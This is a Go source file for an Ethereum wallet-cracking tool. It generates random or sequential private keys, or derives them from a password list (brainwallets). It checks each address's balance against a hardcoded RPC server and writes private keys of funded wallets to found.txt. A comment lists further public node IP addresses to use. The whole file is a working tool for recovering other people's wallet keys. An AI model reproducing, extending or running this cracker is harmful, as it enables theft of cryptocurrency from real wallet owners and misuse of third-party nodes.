package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"hash"
	"io"
	"io/ioutil"
	"log"
	"math/big"
	"math/rand"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

type config struct {
	privKey string
	threads int
	random  bool
	server  string
	port    int
	brain   string
}

const (
	POSSIBLE = "0123456789abcdef"
)

var (
	counter uint64 = 0
	wg      sync.WaitGroup
	usage   = func() {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n", os.Args[0])
		flag.PrintDefaults()
	}
)

func parseConfig() *config {
	var cfg config

	flag.StringVar(&cfg.privKey, "pk", "", "Start private key")
	flag.IntVar(&cfg.threads, "threads", runtime.NumCPU(), "Number of threads")
	flag.BoolVar(&cfg.random, "random", false, "Generate random private key")
	flag.StringVar(&cfg.server, "server", "202.61.239.89", "Ethereum rpc server")
	flag.IntVar(&cfg.port, "port", 8545, "Ethereum rpc port")
	flag.StringVar(&cfg.brain, "brain", "", "Password list")
	flag.Parse()

	return &cfg
}

func getPasswordList(path string) ([]string, error) {
	f, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}

	passwords := strings.Split(string(f), "\n")
	return passwords, nil
}

func SHA256(hasher hash.Hash, input []byte) (hash []byte) {
	hasher.Reset()
	hasher.Write(input)
	hash = hasher.Sum(nil)
	return hash

}

func NewPrivateKey(password string) string {
	hasher := sha256.New()
	sha := SHA256(hasher, []byte(password))
	priv := hex.EncodeToString(sha)
	return priv
}

func generateNextPrivKey(hex string) string {
	sh := strings.Split(hex, "")

	for i := len(hex) - 1; i >= 0; i-- {
		point := strings.Index(POSSIBLE, sh[i])
		if point == 15 {
			sh[i] = "0"
		} else {
			sh[i] = string(POSSIBLE[point+1])
			break
		}
	}
	return strings.Join(sh, "")
}

func generateRandomPrivKey() string {
	rand.Seed(time.Now().UnixNano())

	var randHex string

	for c := 0; c < 64; c++ {
		n := rand.Intn(16)
		randHex += string(POSSIBLE[n])
	}

	return randHex
}

func balanceAt(client *ethclient.Client, address string) (*big.Int, error) {
	account := common.HexToAddress(address)
	balance, err := client.BalanceAt(context.Background(), account, nil)
	if err != nil {
		if err == io.EOF {
			log.Fatalf("Check balance: %s %v\n", address, err)
		}
		return nil, err
	}
	return balance, nil
}

func checkBrainBalance(passwords chan string, client *ethclient.Client) {
	for password := range passwords {
		privKey := NewPrivateKey(password)
		address := generateAddressFromPrivKey(privKey)
		creds := fmt.Sprintf("%s:%s", privKey, address)

		balance, err := balanceAt(client, address)

		if err != nil {
			log.Printf("Check balance: %s %v\n", creds, err)
			continue
		}

		if balance.Cmp(big.NewInt(0)) != 0 {
			data := password + ":" + creds + ":" + balance.String() + "\n"
			writeToFound(data, "found.txt")
		}
		atomic.AddUint64(&counter, 1)
		fmt.Printf("Creds: %s Balance: %s Counter: %d\n", password+":"+creds, balance.String(), atomic.LoadUint64(&counter))
	}
	defer wg.Done()
}

func generateAddressFromPrivKey(hex string) string {
	privateKey, err := crypto.HexToECDSA(hex)
	if err != nil {
		log.Fatal(err)
	}

	publicKey := privateKey.Public()
	publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey)
	if !ok {
		log.Fatal("cannot assert type: publicKey is not of type *ecdsa.PublicKey")
	}

	address := crypto.PubkeyToAddress(*publicKeyECDSA).Hex()
	return address
}

/*
Reserved:
http://47.57.116.69:8545
http://15.235.3.192:8545
http://138.197.226.208:8545
http://138.68.18.195:8545
http://118.190.150.141:8545
http://134.209.168.70:8545
http://206.189.132.206:8545
http://159.65.9.192:8545
http://139.59.117.46:8545
http://165.227.16.243:8545
202.61.239.89:8545 NEW!
*/

func checkBalance(data chan string, client *ethclient.Client) {
	for {
		creds := <-data
		addr := strings.Split(creds, ":")[1]

		balance, err := balanceAt(client, addr)

		if err != nil {
			if err == io.EOF {
				log.Fatalf("Check balance: %s %v\n", creds, err)
			}
			log.Printf("Check balance: %s %v\n", creds, err)
			continue
		}

		if balance.Cmp(big.NewInt(0)) != 0 {
			data := creds + ":" + balance.String() + "\n"
			writeToFound(data, "found.txt")
		}
		atomic.AddUint64(&counter, 1)
		fmt.Printf("Creds: %s Balance: %s Counter: %d\n", creds, balance.String(), atomic.LoadUint64(&counter))
	}
}

func writeToFound(text string, path string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0655)
	if err != nil {
		log.Fatalf("Open file: %s %v\n", text, err)
	}
	defer f.Close()

	_, err = f.WriteString(text)
	if err != nil {
		log.Fatalf("Write string: %s %v\n", text, err)
	}
}

func cleanup() {
	fmt.Println("Total addresses:", atomic.LoadUint64(&counter))
}

func main() {
	cfg := parseConfig()

	client, err := ethclient.Dial("http://" + cfg.server + ":" + strconv.Itoa(cfg.port))
	if err != nil {
		log.Fatalf("Client: %s\n", err)
	}
	defer client.Close()

	chData := make(chan string)
	chExit := make(chan os.Signal)

	signal.Notify(chExit, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-chExit
		cleanup()
		os.Exit(0)
	}()

	if cfg.random {
		for t := 0; t < cfg.threads; t++ {
			go checkBalance(chData, client)
		}

		for {
			pk := generateRandomPrivKey()
			addr := generateAddressFromPrivKey(pk)
			chData <- fmt.Sprintf("%s:%s", pk, addr)
		}
	} else if cfg.privKey != "" {
		if len(cfg.privKey) != 64 {
			log.Fatal("Private key must be large then 64")
		}

		for t := 0; t < cfg.threads; t++ {
			go checkBalance(chData, client)
		}

		pk := cfg.privKey
		for {
			pk = generateNextPrivKey(pk)
			addr := generateAddressFromPrivKey(pk)
			chData <- fmt.Sprintf("%s:%s", pk, addr)
		}
	} else if cfg.brain != "" {
		passList, err := getPasswordList(cfg.brain)
		if err != nil {
			log.Fatal(err)
		}

		for i := 0; i < int(cfg.threads); i++ {
			wg.Add(1)
			go checkBrainBalance(chData, client)
		}

		for _, password := range passList {
			chData <- password
		}
		close(chData)
		wg.Wait()
	} else {
		usage()
	}
}
